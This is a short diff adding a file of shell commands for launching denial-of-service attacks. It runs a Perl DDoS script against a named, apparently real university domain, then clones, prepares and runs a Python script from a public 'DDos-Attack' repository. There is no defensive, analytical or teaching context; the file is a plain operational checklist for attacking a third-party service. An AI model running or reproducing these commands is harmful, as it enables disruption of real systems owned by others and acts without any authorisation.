@@ -1,0 +1,15 @@
+start hotrod-ddos.pl
+
+perl hotrod-ddos.pl -dns aao.cdut.edu.cn
+
+
+start DDos-Attack-master
+
+### git clone https://github.com/Ha3MrX/DDos-Attack
+
+### cd DDos-Attack
+
+### chmod+x ddos-attack.py
+
+### python ddos-attack.py
+
